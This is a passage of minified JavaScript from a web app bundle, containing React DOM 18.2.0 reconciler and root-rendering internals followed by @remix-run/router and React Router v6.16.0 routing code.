            return r = t.type, i = t.pendingProps, i = t.elementType === r ? i : _e(r, i), Iu(e, t, r, i, n);
        case 3:
            e: {
                if (yd(t), e === null) throw Error(x(387));r = t.pendingProps,
                a = t.memoizedState,
                i = a.element,
                Hf(e, t),
                Ki(t, r, null, n);
                var l = t.memoizedState;
                if (r = l.element, a.isDehydrated)
                    if (a = {
                            element: r,
                            isDehydrated: !1,
                            cache: l.cache,
                            pendingSuspenseBoundaries: l.pendingSuspenseBoundaries,
                            transitions: l.transitions
                        }, t.updateQueue.baseState = a, t.memoizedState = a, t.flags & 256) {
                        i = Ln(Error(x(423)), t), t = Ou(e, t, r, n, i);
                        break e
                    } else if (r !== i) {
                    i = Ln(Error(x(424)), t), t = Ou(e, t, r, n, i);
                    break e
                } else
                    for (Ne = Nt(t.stateNode.containerInfo.firstChild), Pe = t, Q = !0, Be = null, n = Yf(t, null, r, n), t.child = n; n;) n.flags = n.flags & -3 | 4096, n = n.sibling;
                else {
                    if (bn(), r === i) {
                        t = ot(e, t, n);
                        break e
                    }
                    me(e, t, r, n)
                }
                t = t.child
            }
            return t;
        case 5:
            return Kf(t), e === null && Ul(t), r = t.type, i = t.pendingProps, a = e !== null ? e.memoizedProps : null, l = i.children, Rl(r, i) ? l = null : a !== null && Rl(r, a) && (t.flags |= 32), gd(e, t), me(e, t, l, n), t.child;
        case 6:
            return e === null && Ul(t), null;
        case 13:
            return wd(e, t, n);
        case 4:
            return Jo(t, t.stateNode.containerInfo), r = t.pendingProps, e === null ? t.child = Tn(t, null, r, n) : me(e, t, r, n), t.child;
        case 11:
            return r = t.type, i = t.pendingProps, i = t.elementType === r ? i : _e(r, i), ju(e, t, r, i, n);
        case 7:
            return me(e, t, t.pendingProps, n), t.child;
        case 8:
            return me(e, t, t.pendingProps.children, n), t.child;
        case 12:
            return me(e, t, t.pendingProps.children, n), t.child;
        case 10:
            e: {
                if (r = t.type._context, i = t.pendingProps, a = t.memoizedProps, l = i.value, U(Qi, r._currentValue), r._currentValue = l, a !== null)
                    if (Qe(a.value, l)) {
                        if (a.children === i.children && !ke.current) {
                            t = ot(e, t, n);
                            break e
                        }
                    } else
                        for (a = t.child, a !== null && (a.return = t); a !== null;) {
                            var o = a.dependencies;
                            if (o !== null) {
                                l = a.child;
                                for (var s = o.firstContext; s !== null;) {
                                    if (s.context === r) {
                                        if (a.tag === 1) {
                                            s = rt(-1, n & -n), s.tag = 2;
                                            var u = a.updateQueue;
                                            if (u !== null) {
                                                u = u.shared;
                                                var f = u.pending;
                                                f === null ? s.next = s : (s.next = f.next, f.next = s), u.pending = s
                                            }
                                        }
                                        a.lanes |= n, s = a.alternate, s !== null && (s.lanes |= n), Bl(a.return, n, t), o.lanes |= n;
                                        break
                                    }
                                    s = s.next
                                }
                            } else if (a.tag === 10) l = a.type === t.type ? null : a.child;
                            else if (a.tag === 18) {
                                if (l = a.return, l === null) throw Error(x(341));
                                l.lanes |= n, o = l.alternate, o !== null && (o.lanes |= n), Bl(l, n, t), l = a.sibling
                            } else l = a.child;
                            if (l !== null) l.return = a;
                            else
                                for (l = a; l !== null;) {
                                    if (l === t) {
                                        l = null;
                                        break
                                    }
                                    if (a = l.sibling, a !== null) {
                                        a.return = l.return, l = a;
                                        break
                                    }
                                    l = l.return
                                }
                            a = l
                        }
                me(e, t, i.children, n),
                t = t.child
            }
            return t;
        case 9:
            return i = t.type, r = t.pendingProps.children, Nn(t, n), i = Re(i), r = r(i), t.flags |= 1, me(e, t, r, n), t.child;
        case 14:
            return r = t.type, i = _e(r, t.pendingProps), i = _e(r.type, i), Au(e, t, r, i, n);
        case 15:
            return hd(e, t, t.type, t.pendingProps, n);
        case 17:
            return r = t.type, i = t.pendingProps, i = t.elementType === r ? i : _e(r, i), Pi(e, t), t.tag = 1, xe(r) ? (e = !0, Hi(t)) : e = !1, Nn(t, n), Wf(t, r, i), Vl(t, r, i, n), Yl(null, t, r, !0, e, n);
        case 19:
            return kd(e, t, n);
        case 22:
            return vd(e, t, n)
    }
    throw Error(x(156, t.tag))
};

function Md(e, t) {
    return sf(e, t)
}

function qh(e, t, n, r) {
    this.tag = e, this.key = n, this.sibling = this.child = this.return = this.stateNode = this.type = this.elementType = null, this.index = 0, this.ref = null, this.pendingProps = t, this.dependencies = this.memoizedState = this.updateQueue = this.memoizedProps = null, this.mode = r, this.subtreeFlags = this.flags = 0, this.deletions = null, this.childLanes = this.lanes = 0, this.alternate = null
}

function ze(e, t, n, r) {
    return new qh(e, t, n, r)
}

function ds(e) {
    return e = e.prototype, !(!e || !e.isReactComponent)
}

function $h(e) {
    if (typeof e == "function") return ds(e) ? 1 : 0;
    if (e != null) {
        if (e = e.$$typeof, e === bo) return 11;
        if (e === To) return 14
    }
    return 2
}

function It(e, t) {
    var n = e.alternate;
    return n === null ? (n = ze(e.tag, t, e.key, e.mode), n.elementType = e.elementType, n.type = e.type, n.stateNode = e.stateNode, n.alternate = e, e.alternate = n) : (n.pendingProps = t, n.type = e.type, n.flags = 0, n.subtreeFlags = 0, n.deletions = null), n.flags = e.flags & 14680064, n.childLanes = e.childLanes, n.lanes = e.lanes, n.child = e.child, n.memoizedProps = e.memoizedProps, n.memoizedState = e.memoizedState, n.updateQueue = e.updateQueue, t = e.dependencies, n.dependencies = t === null ? null : {
        lanes: t.lanes,
        firstContext: t.firstContext
    }, n.sibling = e.sibling, n.index = e.index, n.ref = e.ref, n
}

function Ii(e, t, n, r, i, a) {
    var l = 2;
    if (r = e, typeof e == "function") ds(e) && (l = 1);
    else if (typeof e == "string") l = 5;
    else e: switch (e) {
        case on:
            return Gt(n.children, i, a, t);
        case Oo:
            l = 8, i |= 8;
            break;
        case pl:
            return e = ze(12, n, t, i | 2), e.elementType = pl, e.lanes = a, e;
        case ml:
            return e = ze(13, n, t, i), e.elementType = ml, e.lanes = a, e;
        case hl:
            return e = ze(19, n, t, i), e.elementType = hl, e.lanes = a, e;
        case Wc:
            return wa(n, i, a, t);
        default:
            if (typeof e == "object" && e !== null) switch (e.$$typeof) {
                case Hc:
                    l = 10;
                    break e;
                case Vc:
                    l = 9;
                    break e;
                case bo:
                    l = 11;
                    break e;
                case To:
                    l = 14;
                    break e;
                case ht:
                    l = 16, r = null;
                    break e
            }
            throw Error(x(130, e == null ? e : typeof e, ""))
    }
    return t = ze(l, n, t, i), t.elementType = e, t.type = r, t.lanes = a, t
}

function Gt(e, t, n, r) {
    return e = ze(7, e, r, t), e.lanes = n, e
}

function wa(e, t, n, r) {
    return e = ze(22, e, r, t), e.elementType = Wc, e.lanes = n, e.stateNode = {
        isHidden: !1
    }, e
}

function il(e, t, n) {
    return e = ze(6, e, null, t), e.lanes = n, e
}

function al(e, t, n) {
    return t = ze(4, e.children !== null ? e.children : [], e.key, t), t.lanes = n, t.stateNode = {
        containerInfo: e.containerInfo,
        pendingChildren: null,
        implementation: e.implementation
    }, t
}

function e1(e, t, n, r, i) {
    this.tag = t, this.containerInfo = e, this.finishedWork = this.pingCache = this.current = this.pendingChildren = null, this.timeoutHandle = -1, this.callbackNode = this.pendingContext = this.context = null, this.callbackPriority = 0, this.eventTimes = _a(0), this.expirationTimes = _a(-1), this.entangledLanes = this.finishedLanes = this.mutableReadLanes = this.expiredLanes = this.pingedLanes = this.suspendedLanes = this.pendingLanes = 0, this.entanglements = _a(0), this.identifierPrefix = r, this.onRecoverableError = i, this.mutableSourceEagerHydrationData = null
}

function ps(e, t, n, r, i, a, l, o, s) {
    return e = new e1(e, t, n, o, s), t === 1 ? (t = 1, a === !0 && (t |= 8)) : t = 0, a = ze(3, null, null, t), e.current = a, a.stateNode = e, a.memoizedState = {
        element: r,
        isDehydrated: n,
        cache: null,
        transitions: null,
        pendingSuspenseBoundaries: null
    }, Xo(a), e
}

function t1(e, t, n) {
    var r = 3 < arguments.length && arguments[3] !== void 0 ? arguments[3] : null;
    return {
        $$typeof: ln,
        key: r == null ? null : "" + r,
        children: e,
        containerInfo: t,
        implementation: n
    }
}

function Dd(e) {
    if (!e) return bt;
    e = e._reactInternals;
    e: {
        if (rn(e) !== e || e.tag !== 1) throw Error(x(170));
        var t = e;do {
            switch (t.tag) {
                case 3:
                    t = t.stateNode.context;
                    break e;
                case 1:
                    if (xe(t.type)) {
                        t = t.stateNode.__reactInternalMemoizedMergedChildContext;
                        break e
                    }
            }
            t = t.return
        } while (t !== null);
        throw Error(x(171))
    }
    if (e.tag === 1) {
        var n = e.type;
        if (xe(n)) return Mf(e, n, t)
    }
    return t
}

function Fd(e, t, n, r, i, a, l, o, s) {
    return e = ps(n, r, !0, e, i, a, l, o, s), e.context = Dd(null), n = e.current, r = he(), i = At(n), a = rt(r, i), a.callback = t ? ? null, Pt(n, a, i), e.current.lanes = i, Dr(e, i, r), Se(e, r), e
}

function ka(e, t, n, r) {
    var i = t.current,
        a = he(),
        l = At(i);
    return n = Dd(n), t.context === null ? t.context = n : t.pendingContext = n, t = rt(a, l), t.payload = {
        element: e
    }, r = r === void 0 ? null : r, r !== null && (t.callback = r), e = Pt(i, t, l), e !== null && (We(e, i, l, a), Ei(e, i, l)), l
}

function ta(e) {
    if (e = e.current, !e.child) return null;
    switch (e.child.tag) {
        case 5:
            return e.child.stateNode;
        default:
            return e.child.stateNode
    }
}

function Uu(e, t) {
    if (e = e.memoizedState, e !== null && e.dehydrated !== null) {
        var n = e.retryLane;
        e.retryLane = n !== 0 && n < t ? n : t
    }
}

function ms(e, t) {
    Uu(e, t), (e = e.alternate) && Uu(e, t)
}

function n1() {
    return null
}
var _d = typeof reportError == "function" ? reportError : function(e) {
    console.error(e)
};

function hs(e) {
    this._internalRoot = e
}
xa.prototype.render = hs.prototype.render = function(e) {
    var t = this._internalRoot;
    if (t === null) throw Error(x(409));
    ka(e, t, null, null)
};
xa.prototype.unmount = hs.prototype.unmount = function() {
    var e = this._internalRoot;
    if (e !== null) {
        this._internalRoot = null;
        var t = e.containerInfo;
        $t(function() {
            ka(null, e, null, null)
        }), t[at] = null
    }
};

function xa(e) {
    this._internalRoot = e
}
xa.prototype.unstable_scheduleHydration = function(e) {
    if (e) {
        var t = hf();
        e = {
            blockedOn: null,
            target: e,
            priority: t
        };
        for (var n = 0; n < gt.length && t !== 0 && t < gt[n].priority; n++);
        gt.splice(n, 0, e), n === 0 && gf(e)
    }
};

function vs(e) {
    return !(!e || e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11)
}

function Sa(e) {
    return !(!e || e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11 && (e.nodeType !== 8 || e.nodeValue !== " react-mount-point-unstable "))
}

function Bu() {}

function r1(e, t, n, r, i) {
    if (i) {
        if (typeof r == "function") {
            var a = r;
            r = function() {
                var u = ta(l);
                a.call(u)
            }
        }
        var l = Fd(t, r, e, 0, null, !1, !1, "", Bu);
        return e._reactRootContainer = l, e[at] = l.current, xr(e.nodeType === 8 ? e.parentNode : e), $t(), l
    }
    for (; i = e.lastChild;) e.removeChild(i);
    if (typeof r == "function") {
        var o = r;
        r = function() {
            var u = ta(s);
            o.call(u)
        }
    }
    var s = ps(e, 0, !1, null, null, !1, !1, "", Bu);
    return e._reactRootContainer = s, e[at] = s.current, xr(e.nodeType === 8 ? e.parentNode : e), $t(function() {
        ka(t, s, n, r)
    }), s
}

function Ea(e, t, n, r, i) {
    var a = n._reactRootContainer;
    if (a) {
        var l = a;
        if (typeof i == "function") {
            var o = i;
            i = function() {
                var s = ta(l);
                o.call(s)
            }
        }
        ka(t, l, e, i)
    } else l = r1(n, t, e, i, r);
    return ta(l)
}
pf = function(e) {
    switch (e.tag) {
        case 3:
            var t = e.stateNode;
            if (t.current.memoizedState.isDehydrated) {
                var n = $n(t.pendingLanes);
                n !== 0 && (Ro(t, n | 1), Se(t, q()), !(D & 6) && (Rn = q() + 500, Dt()))
            }
            break;
        case 13:
            $t(function() {
                var r = lt(e, 1);
                if (r !== null) {
                    var i = he();
                    We(r, e, 1, i)
                }
            }), ms(e, 1)
    }
};
Mo = function(e) {
    if (e.tag === 13) {
        var t = lt(e, 134217728);
        if (t !== null) {
            var n = he();
            We(t, e, 134217728, n)
        }
        ms(e, 134217728)
    }
};
mf = function(e) {
    if (e.tag === 13) {
        var t = At(e),
            n = lt(e, t);
        if (n !== null) {
            var r = he();
            We(n, e, t, r)
        }
        ms(e, t)
    }
};
hf = function() {
    return _
};
vf = function(e, t) {
    var n = _;
    try {
        return _ = e, t()
    } finally {
        _ = n
    }
};
Nl = function(e, t, n) {
    switch (t) {
        case "input":
            if (yl(e, n), t = n.name, n.type === "radio" && t != null) {
                for (n = e; n.parentNode;) n = n.parentNode;
                for (n = n.querySelectorAll("input[name=" + JSON.stringify("" + t) + '][type="radio"]'), t = 0; t < n.length; t++) {
                    var r = n[t];
                    if (r !== e && r.form === e.form) {
                        var i = pa(r);
                        if (!i) throw Error(x(90));
                        Yc(r), yl(r, i)
                    }
                }
            }
            break;
        case "textarea":
            Gc(e, n);
            break;
        case "select":
            t = n.value, t != null && xn(e, !!n.multiple, t, !1)
    }
};
tf = us;
nf = $t;
var i1 = {
        usingClientEntryPoint: !1,
        Events: [_r, fn, pa, $c, ef, us]
    },
    Xn = {
        findFiberByHostInstance: Ht,
        bundleType: 0,
        version: "18.2.0",
        rendererPackageName: "react-dom"
    },
    a1 = {
        bundleType: Xn.bundleType,
        version: Xn.version,
        rendererPackageName: Xn.rendererPackageName,
        rendererConfig: Xn.rendererConfig,
        overrideHookState: null,
        overrideHookStateDeletePath: null,
        overrideHookStateRenamePath: null,
        overrideProps: null,
        overridePropsDeletePath: null,
        overridePropsRenamePath: null,
        setErrorHandler: null,
        setSuspenseHandler: null,
        scheduleUpdate: null,
        currentDispatcherRef: ft.ReactCurrentDispatcher,
        findHostInstanceByFiber: function(e) {
            return e = lf(e), e === null ? null : e.stateNode
        },
        findFiberByHostInstance: Xn.findFiberByHostInstance || n1,
        findHostInstancesForRefresh: null,
        scheduleRefresh: null,
        scheduleRoot: null,
        setRefreshHandler: null,
        getCurrentFiber: null,
        reconcilerVersion: "18.2.0-next-9e3b772b8-20220608"
    };
if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
    var si = __REACT_DEVTOOLS_GLOBAL_HOOK__;
    if (!si.isDisabled && si.supportsFiber) try {
        ua = si.inject(a1), Je = si
    } catch {}
}
Ae.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = i1;
Ae.createPortal = function(e, t) {
    var n = 2 < arguments.length && arguments[2] !== void 0 ? arguments[2] : null;
    if (!vs(t)) throw Error(x(200));
    return t1(e, t, null, n)
};
Ae.createRoot = function(e, t) {
    if (!vs(e)) throw Error(x(299));
    var n = !1,
        r = "",
        i = _d;
    return t != null && (t.unstable_strictMode === !0 && (n = !0), t.identifierPrefix !== void 0 && (r = t.identifierPrefix), t.onRecoverableError !== void 0 && (i = t.onRecoverableError)), t = ps(e, 1, !1, null, null, n, !1, r, i), e[at] = t.current, xr(e.nodeType === 8 ? e.parentNode : e), new hs(t)
};
Ae.findDOMNode = function(e) {
    if (e == null) return null;
    if (e.nodeType === 1) return e;
    var t = e._reactInternals;
    if (t === void 0) throw typeof e.render == "function" ? Error(x(188)) : (e = Object.keys(e).join(","), Error(x(268, e)));
    return e = lf(t), e = e === null ? null : e.stateNode, e
};
Ae.flushSync = function(e) {
    return $t(e)
};
Ae.hydrate = function(e, t, n) {
    if (!Sa(t)) throw Error(x(200));
    return Ea(null, e, t, !0, n)
};
Ae.hydrateRoot = function(e, t, n) {
    if (!vs(e)) throw Error(x(405));
    var r = n != null && n.hydratedSources || null,
        i = !1,
        a = "",
        l = _d;
    if (n != null && (n.unstable_strictMode === !0 && (i = !0), n.identifierPrefix !== void 0 && (a = n.identifierPrefix), n.onRecoverableError !== void 0 && (l = n.onRecoverableError)), t = Fd(t, null, e, 1, n ? ? null, i, !1, a, l), e[at] = t.current, xr(e), r)
        for (e = 0; e < r.length; e++) n = r[e], i = n._getVersion, i = i(n._source), t.mutableSourceEagerHydrationData == null ? t.mutableSourceEagerHydrationData = [n, i] : t.mutableSourceEagerHydrationData.push(n, i);
    return new xa(t)
};
Ae.render = function(e, t, n) {
    if (!Sa(t)) throw Error(x(200));
    return Ea(null, e, t, !1, n)
};
Ae.unmountComponentAtNode = function(e) {
    if (!Sa(e)) throw Error(x(40));
    return e._reactRootContainer ? ($t(function() {
        Ea(null, null, e, !1, function() {
            e._reactRootContainer = null, e[at] = null
        })
    }), !0) : !1
};
Ae.unstable_batchedUpdates = us;
Ae.unstable_renderSubtreeIntoContainer = function(e, t, n, r) {
    if (!Sa(n)) throw Error(x(200));
    if (e == null || e._reactInternals === void 0) throw Error(x(38));
    return Ea(e, t, n, !1, r)
};
Ae.version = "18.2.0-next-9e3b772b8-20220608";

function Ud() {
    if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function")) try {
        __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(Ud)
    } catch (e) {
        console.error(e)
    }
}
Ud(), Dc.exports = Ae;
var l1 = Dc.exports,
    Hu = l1;
fl.createRoot = Hu.createRoot, fl.hydrateRoot = Hu.hydrateRoot;
/**
 * @remix-run/router v1.9.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */
function na() {
    return na = Object.assign ? Object.assign.bind() : function(e) {
        for (var t = 1; t < arguments.length; t++) {
            var n = arguments[t];
            for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r])
        }
        return e
    }, na.apply(this, arguments)
}
var xt;
(function(e) {
    e.Pop = "POP", e.Push = "PUSH", e.Replace = "REPLACE"
})(xt || (xt = {}));
const Vu = "popstate";

function o1(e) {
    e === void 0 && (e = {});

    function t(r, i) {
        let {
            pathname: a,
            search: l,
            hash: o
        } = r.location;
        return io("", {
            pathname: a,
            search: l,
            hash: o
        }, i.state && i.state.usr || null, i.state && i.state.key || "default")
    }

    function n(r, i) {
        return typeof i == "string" ? i : Bd(i)
    }
    return u1(t, n, null, e)
}

function Ee(e, t) {
    if (e === !1 || e === null || typeof e > "u") throw new Error(t)
}

function gs(e, t) {
    if (!e) {
        typeof console < "u" && console.warn(t);
        try {
            throw new Error(t)
        } catch {}
    }
}

function s1() {
    return Math.random().toString(36).substr(2, 8)
}

function Wu(e, t) {
    return {
        usr: e.state,
        key: e.key,
        idx: t
    }
}

function io(e, t, n, r) {
    return n === void 0 && (n = null), na({
        pathname: typeof e == "string" ? e : e.pathname,
        search: "",
        hash: ""
    }, typeof t == "string" ? Ca(t) : t, {
        state: n,
        key: t && t.key || r || s1()
    })
}

function Bd(e) {
    let {
        pathname: t = "/",
        search: n = "",
        hash: r = ""
    } = e;
    return n && n !== "?" && (t += n.charAt(0) === "?" ? n : "?" + n), r && r !== "#" && (t += r.charAt(0) === "#" ? r : "#" + r), t
}

function Ca(e) {
    let t = {};
    if (e) {
        let n = e.indexOf("#");
        n >= 0 && (t.hash = e.substr(n), e = e.substr(0, n));
        let r = e.indexOf("?");
        r >= 0 && (t.search = e.substr(r), e = e.substr(0, r)), e && (t.pathname = e)
    }
    return t
}

function u1(e, t, n, r) {
    r === void 0 && (r = {});
    let {
        window: i = document.defaultView,
        v5Compat: a = !1
    } = r, l = i.history, o = xt.Pop, s = null, u = f();
    u == null && (u = 0, l.replaceState(na({}, l.state, {
        idx: u
    }), ""));

    function f() {
        return (l.state || {
            idx: null
        }).idx
    }

    function m() {
        o = xt.Pop;
        let E = f(),
            p = E == null ? null : E - u;
        u = E, s && s({
            action: o,
            location: k.location,
            delta: p
        })
    }

    function v(E, p) {
        o = xt.Push;
        let c = io(k.location, E, p);
        n && n(c, E), u = f() + 1;
        let h = Wu(c, u),
            y = k.createHref(c);
        try {
            l.pushState(h, "", y)
        } catch (S) {
            if (S instanceof DOMException && S.name === "DataCloneError") throw S;
            i.location.assign(y)
        }
        a && s && s({
            action: o,
            location: k.location,
            delta: 1
        })
    }

    function g(E, p) {
        o = xt.Replace;
        let c = io(k.location, E, p);
        n && n(c, E), u = f();
        let h = Wu(c, u),
            y = k.createHref(c);
        l.replaceState(h, "", y), a && s && s({
            action: o,
            location: k.location,
            delta: 0
        })
    }

    function w(E) {
        let p = i.location.origin !== "null" ? i.location.origin : i.location.href,
            c = typeof E == "string" ? E : Bd(E);
        return Ee(p, "No window.location.(origin|href) available to create URL for href: " + c), new URL(c, p)
    }
    let k = {
        get action() {
            return o
        },
        get location() {
            return e(i, l)
        },
        listen(E) {
            if (s) throw new Error("A history only accepts one active listener");
            return i.addEventListener(Vu, m), s = E, () => {
                i.removeEventListener(Vu, m), s = null
            }
        },
        createHref(E) {
            return t(i, E)
        },
        createURL: w,
        encodeLocation(E) {
            let p = w(E);
            return {
                pathname: p.pathname,
                search: p.search,
                hash: p.hash
            }
        },
        push: v,
        replace: g,
        go(E) {
            return l.go(E)
        }
    };
    return k
}
var Qu;
(function(e) {
    e.data = "data", e.deferred = "deferred", e.redirect = "redirect", e.error = "error"
})(Qu || (Qu = {}));

function c1(e, t, n) {
    n === void 0 && (n = "/");
    let r = typeof t == "string" ? Ca(t) : t,
        i = Wd(r.pathname || "/", n);
    if (i == null) return null;
    let a = Hd(e);
    f1(a);
    let l = null;
    for (let o = 0; l == null && o < a.length; ++o) l = k1(a[o], E1(i));
    return l
}

function Hd(e, t, n, r) {
    t === void 0 && (t = []), n === void 0 && (n = []), r === void 0 && (r = "");
    let i = (a, l, o) => {
        let s = {
            relativePath: o === void 0 ? a.path || "" : o,
            caseSensitive: a.caseSensitive === !0,
            childrenIndex: l,
            route: a
        };
        s.relativePath.startsWith("/") && (Ee(s.relativePath.startsWith(r), 'Absolute route path "' + s.relativePath + '" nested under path ' + ('"' + r + '" is not valid. An absolute child route path ') + "must start with the combined path of all its parent routes."), s.relativePath = s.relativePath.slice(r.length));
        let u = jn([r, s.relativePath]),
            f = n.concat(s);
        a.children && a.children.length > 0 && (Ee(a.index !== !0, "Index routes must not have child routes. Please remove " + ('all child routes from route path "' + u + '".')), Hd(a.children, t, f, u)), !(a.path == null && !a.index) && t.push({
            path: u,
            score: y1(u, a.index),
            routesMeta: f
        })
    };
    return e.forEach((a, l) => {
        var o;
        if (a.path === "" || !((o = a.path) != null && o.includes("?"))) i(a, l);
        else
            for (let s of Vd(a.path)) i(a, l, s)
    }), t
}

function Vd(e) {
    let t = e.split("/");
    if (t.length === 0) return [];
    let [n, ...r] = t, i = n.endsWith("?"), a = n.replace(/\?$/, "");
    if (r.length === 0) return i ? [a, ""] : [a];
    let l = Vd(r.join("/")),
        o = [];
    return o.push(...l.map(s => s === "" ? a : [a, s].join("/"))), i && o.push(...l), o.map(s => e.startsWith("/") && s === "" ? "/" : s)
}

function f1(e) {
    e.sort((t, n) => t.score !== n.score ? n.score - t.score : w1(t.routesMeta.map(r => r.childrenIndex), n.routesMeta.map(r => r.childrenIndex)))
}
const d1 = /^:\w+$/,
    p1 = 3,
    m1 = 2,
    h1 = 1,
    v1 = 10,
    g1 = -2,
    Yu = e => e === "*";

function y1(e, t) {
    let n = e.split("/"),
        r = n.length;
    return n.some(Yu) && (r += g1), t && (r += m1), n.filter(i => !Yu(i)).reduce((i, a) => i + (d1.test(a) ? p1 : a === "" ? h1 : v1), r)
}

function w1(e, t) {
    return e.length === t.length && e.slice(0, -1).every((r, i) => r === t[i]) ? e[e.length - 1] - t[t.length - 1] : 0
}

function k1(e, t) {
    let {
        routesMeta: n
    } = e, r = {}, i = "/", a = [];
    for (let l = 0; l < n.length; ++l) {
        let o = n[l],
            s = l === n.length - 1,
            u = i === "/" ? t : t.slice(i.length) || "/",
            f = x1({
                path: o.relativePath,
                caseSensitive: o.caseSensitive,
                end: s
            }, u);
        if (!f) return null;
        Object.assign(r, f.params);
        let m = o.route;
        a.push({
            params: r,
            pathname: jn([i, f.pathname]),
            pathnameBase: N1(jn([i, f.pathnameBase])),
            route: m
        }), f.pathnameBase !== "/" && (i = jn([i, f.pathnameBase]))
    }
    return a
}

function x1(e, t) {
    typeof e == "string" && (e = {
        path: e,
        caseSensitive: !1,
        end: !0
    });
    let [n, r] = S1(e.path, e.caseSensitive, e.end), i = t.match(n);
    if (!i) return null;
    let a = i[0],
        l = a.replace(/(.)\/+$/, "$1"),
        o = i.slice(1);
    return {
        params: r.reduce((u, f, m) => {
            if (f === "*") {
                let v = o[m] || "";
                l = a.slice(0, a.length - v.length).replace(/(.)\/+$/, "$1")
            }
            return u[f] = C1(o[m] || "", f), u
        }, {}),
        pathname: a,
        pathnameBase: l,
        pattern: e
    }
}

function S1(e, t, n) {
    t === void 0 && (t = !1), n === void 0 && (n = !0), gs(e === "*" || !e.endsWith("*") || e.endsWith("/*"), 'Route path "' + e + '" will be treated as if it were ' + ('"' + e.replace(/\*$/, "/*") + '" because the `*` character must ') + "always follow a `/` in the pattern. To get rid of this warning, " + ('please change the route path to "' + e.replace(/\*$/, "/*") + '".'));
    let r = [],
        i = "^" + e.replace(/\/*\*?$/, "").replace(/^\/*/, "/").replace(/[\\.*+^$?{}|()[\]]/g, "\\$&").replace(/\/:(\w+)/g, (l, o) => (r.push(o), "/([^\\/]+)"));
    return e.endsWith("*") ? (r.push("*"), i += e === "*" || e === "/*" ? "(.*)$" : "(?:\\/(.+)|\\/*)$") : n ? i += "\\/*$" : e !== "" && e !== "/" && (i += "(?:(?=\\/|$))"), [new RegExp(i, t ? void 0 : "i"), r]
}

function E1(e) {
    try {
        return decodeURI(e)
    } catch (t) {
        return gs(!1, 'The URL path "' + e + '" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent ' + ("encoding (" + t + ").")), e
    }
}

function C1(e, t) {
    try {
        return decodeURIComponent(e)
    } catch (n) {
        return gs(!1, 'The value for the URL param "' + t + '" will not be decoded because' + (' the string "' + e + '" is a malformed URL segment. This is probably') + (" due to a bad percent encoding (" + n + ").")), e
    }
}

function Wd(e, t) {
    if (t === "/") return e;
    if (!e.toLowerCase().startsWith(t.toLowerCase())) return null;
    let n = t.endsWith("/") ? t.length - 1 : t.length,
        r = e.charAt(n);
    return r && r !== "/" ? null : e.slice(n) || "/"
}
const jn = e => e.join("/").replace(/\/\/+/g, "/"),
    N1 = e => e.replace(/\/+$/, "").replace(/^\/*/, "/");

function P1(e) {
    return e != null && typeof e.status == "number" && typeof e.statusText == "string" && typeof e.internal == "boolean" && "data" in e
}
const Qd = ["post", "put", "patch", "delete"];
new Set(Qd);
const j1 = ["get", ...Qd];
new Set(j1);
/**
 * React Router v6.16.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */
function ao() {
    return ao = Object.assign ? Object.assign.bind() : function(e) {
        for (var t = 1; t < arguments.length; t++) {
            var n = arguments[t];
            for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r])
        }
        return e
    }, ao.apply(this, arguments)
}
const A1 = b.createContext(null),
    I1 = b.createContext(null),
    Yd = b.createContext(null),
    Na = b.createContext(null),
    Pa = b.createContext({
        outlet: null,
        matches: [],
        isDataRoute: !1
    }),
    Kd = b.createContext(null);

function ys() {
    return b.useContext(Na) != null
}

function O1() {
    return ys() || Ee(!1), b.useContext(Na).location
}

function b1(e, t) {
    return T1(e, t)
}

function T1(e, t, n) {
    ys() || Ee(!1);
    let {
        navigator: r
    } = b.useContext(Yd), {
        matches: i
    } = b.useContext(Pa), a = i[i.length - 1], l = a ? a.params : {};
    a && a.pathname;
    let o = a ? a.pathnameBase : "/";
    a && a.route;
    let s = O1(),
        u;
    if (t) {
        var f;
        let k = typeof t == "string" ? Ca(t) : t;
        o === "/" || (f = k.pathname) != null && f.startsWith(o) || Ee(!1), u = k
    } else u = s;
    let m = u.pathname || "/",
        v = o === "/" ? m : m.slice(o.length) || "/",
        g = c1(e, {
            pathname: v
        }),
        w = D1(g && g.map(k => Object.assign({}, k, {
            params: Object.assign({}, l, k.params),
            pathname: jn([o, r.encodeLocation ? r.encodeLocation(k.pathname).pathname : k.pathname]),
            pathnameBase: k.pathnameBase === "/" ? o : jn([o, r.encodeLocation ? r.encodeLocation(k.pathnameBase).pathname : k.pathnameBase])
        })), i, n);
    return t && w ? b.createElement(Na.Provider, {
        value: {
            location: ao({
                pathname: "/",
                search: "",
                hash: "",
                state: null,
                key: "default"
            }, u),
            navigationType: xt.Pop
        }
    }, w) : w
}

function z1() {
    let e = B1(),
        t = P1(e) ? e.status + " " + e.statusText : e instanceof Error ? e.message : JSON.stringify(e),
        n = e instanceof Error ? e.stack : null,
        i = {
            padding: "0.5rem",
            backgroundColor: "rgba(200,200,200, 0.5)"
        },
        a = null;
    return b.createElement(b.Fragment, null, b.createElement("h2", null, "Unexpected Application Error!"), b.createElement("h3", {
        style: {
            fontStyle: "italic"
        }
    }, t), n ? b.createElement("pre", {
        style: i
    }, n) : null, a)
}
const L1 = b.createElement(z1, null);
class R1 extends b.Component {
    constructor(t) {
        super(t), this.state = {
            location: t.location,
            revalidation: t.revalidation,
            error: t.error
        }
    }
    static getDerivedStateFromError(t) {
        return {
            error: t
        }
    }
    static getDerivedStateFromProps(t, n) {
        return n.location !== t.location || n.revalidation !== "idle" && t.revalidation === "idle" ? {
            error: t.error,
            location: t.location,
            revalidation: t.revalidation
        } : {
            error: t.error || n.error,
            location: n.location,
            revalidation: t.revalidation || n.revalidation
        }
    }
    componentDidCatch(t, n) {
        console.error("React Router caught the following error during render", t, n)
    }
    render() {
        return this.state.error ? b.createElement(Pa.Provider, {
